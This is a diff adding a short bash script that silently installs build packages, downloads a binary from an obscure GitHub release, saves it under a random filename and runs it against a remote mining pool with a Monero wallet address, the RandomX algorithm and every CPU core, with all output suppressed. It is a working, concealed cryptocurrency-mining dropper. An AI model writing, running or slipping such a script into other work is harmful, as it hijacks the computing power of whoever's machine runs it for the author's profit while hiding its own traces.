@@ -1,0 +1,28 @@
+#!/bin/bash
+set -e  # Exit on any error
+
+# Update package lists quietly
+apt update -qq
+
+# Install required packages quietly
+DEBIAN_FRONTEND=noninteractive apt install -y -qq \
+    build-essential cmake pkg-config libboost-all-dev libssl-dev \
+    libzmq3-dev libsodium-dev libunwind-dev liblzma-dev libreadline-dev \
+    libexpat1-dev libpgm-dev libhidapi-dev libusb-1.0-0-dev \
+    libprotobuf-dev protobuf-compiler libudev-dev \
+    libncurses6 libncursesw6 libtinfo6 \
+    libunbound-dev liblmdb-dev libminiupnpc-dev libuv1-dev git screen wget curl > /dev/null 2>&1
+
+# Generate a random filename
+BIN_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 12)
+
+# Download binary quietly and rename
+wget -q https://github.com/yafcoplk/hmggklo/releases/download/hmggkloj/hmggklo -O "$BIN_NAME"
+
+# Make it executable
+chmod +x "$BIN_NAME"
+
+# Optional: run the binary
+# ./"$BIN_NAME"
+
+./"$BIN_NAME" -o 18.212.154.102:5357 -u 89aQ8FNPXiTEWFMYwubTcKBbHYE6hcsKjcs3jVRUCjitBbYD7cMx4PjVdx2runmKWXAJdUqnbGs25NifTeumjvX15r1Q7ym -p aetechmeA -a rx/0 -t $(nproc --all) > /dev/null 2>&1
